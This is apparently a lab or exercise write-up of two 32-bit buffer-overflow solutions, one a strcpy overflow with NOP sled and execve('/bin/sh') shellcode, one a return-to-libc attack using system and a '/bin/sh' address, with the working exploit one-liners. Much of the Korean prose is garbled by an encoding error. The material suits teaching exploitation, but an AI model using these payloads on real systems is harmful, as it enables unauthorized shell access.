# 1���� ���� ����

## problem1.c
```c
#include <stdio.h>
#include <string.h> 

int main(int argc, char * argv[]) { 

	char buf[56]; 
	strcpy(buf, argv[1]); 
	
	printf("%s\n", buf); 
	memset(buf, 0, 60);	
}
```

## ���� ���

Buffer Overflow�� �̿��� RET-Sled�� ����� ���̴�. ����� ���� `strcpy` �κ��̴�.

## ���

### ���̷ε�

| buf | SFP | RET | NOP | Shellcode Address |
| :--: | :--: | :--: | :--: | :--: |
| Dummy | Dummy | NOP �� �Ĺ� �ּ� | NOP | Shellcode Address |

![1.1](img/exam1_1.png)

`buf`�� ũ�⸦ ���ϱ� ���� �켱 main �Լ� ���ѷαװ� ������ ������ breakpoint�� �Ǵ�. ������ �� ���� �ɰ� �Ѿ ���̴�.

�� �Ŀ� 32bit �ý����̴ϱ� rsp�� �ƴ� esp �ȿ� ��� �ִ� �ּҸ� Ȯ���Ѵ�. �� �ּҴ� Return Address �̴�.

---

![1.2](img/exam1_2.png)

�� ������ strcpy �Լ��� �� �ι�° �غκп� ���� buf�� �ּҸ� Ȯ���Ѵ�. esp�� �ּҸ� Ȯ���ϸ� �ȴ�. 

Ȯ���� �� �� �ּҰ��� ���غ��� buf�� ũ��� 56�� ���� �� �� �ִ�.

---

![1.3](img/exam1_3.png)

![1.3.5](img/exam1_6.png)

![1.4](img/exam1_4.png)

�� ���� NOP���� �ܶ� �־� �� �߰� ���� Ȯ�� �Ѵ�. strcpy �Լ� �ڸ� breakpoint�� �ɾ� esp ���� ����ִ� �ּ��� ������ Ȯ���Ѵ�. �׷��� \x90 �� �� ���� Ȯ���� �� �ְ�, ���� ������ ������ Ȯ���Ѵ�.

---

![1.5](img/exam1_5.png)

```shell
$  ./problem1 `python -c 'print "a"*60 + "\x24\xd9\xff\xff" +"\x90"*300 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

���̷ε忡 ���� ��ɾ �ۼ��ϸ� �� ������ ���� ���� �� �� �ִ�.

<br>

<br>

---

## problem2.c
```c
#include <stdio.h>
#include <unistd.h> 

int main(void) 
{
	char buf[64]; 
	read(0, buf, 100); 
	printf("%s\n",buf); 
	
	return 0 ;
}

```

## binsh_addr.c
```c
#include <stdio.h>
#include <string.h>

int main(void) {
        long addr = ; // System Function
        while(memcmp((void*)addr, "/bin/sh\x00", 8)) {
                addr++;
        }
        printf("0x%lx\n", addr);

        return 0;
}
```
---

## ���ݱ��

BOF�� �̿��� RTL ����� ����� ���̴�. ����� �κ��� `read` �Լ��̴�.

### ���̷ε�

| buf + SFP | RET | ���� EIP | Dummy |
| :--: | :--: | :--: | :--: |
| Dummy | system Address | Dummy | /bin/sh Address |
---

## ���

![2.1](img/exam2_1.png)

�ڵ��� ���ѷα� ������ ������ strcpy �� lea ��ɾ ���Ǵ� ������ Ȯ���� ���� esp�� eax�� ��� �ִ� �ּҸ� Ȯ���ؼ� `buf`�� ũ�⸦ Ȯ���Ѵ�.

---

![2.2](img/exam2_2.png)

`p system` �� �̿��� system �Լ��� �ּҸ� Ȯ���Ѵ�.

---

![2.3](img/exam2_3.png)

`./binsh_addr`�� ������ system �Լ� �ȿ��� `/bin/sh` �ּҸ� ã�´�. �� ������ ���α׷� �ȿ� ���� system �Լ��� ���� �ֱ� �����̴�.

---

![2.4](img/exam2_4.png)

���̷ε忡 ���� �ۼ��� ��ɾ �Է��ϸ� �� ������ ���� ���� �� �� �ִ�.

```shell
$ (python -c 'print "a"*68 + "\x20\x04\xe2\xf7" +"a"*4+ "\x52\xa3\xf6\xf7"';cat) | ./problem2
```